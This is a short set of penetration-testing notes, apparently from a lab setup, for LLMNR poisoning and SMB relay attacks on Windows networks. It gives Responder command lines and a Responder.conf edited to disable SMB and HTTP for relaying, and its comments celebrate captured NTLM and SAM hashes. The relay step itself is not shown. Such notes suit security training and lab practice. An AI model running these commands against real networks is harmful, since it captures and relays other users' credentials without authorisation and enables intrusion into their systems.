# LLMNR Poisoning
```bash 
'start the responder tool'

responder -I tun0 -dwv

'got the hash <3'
```
# SMB Relay Attack
```bash 
'start the responder tool (turn off smb and http)'

nano /etc/responder/Responder.conf 

┌──(root💀kali)-[/var/www/html/login]
└─# cat /etc/responder/Responder.conf
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On

'then start the tool'

responder -I tun0 -dwv

'got the sam hash'

```
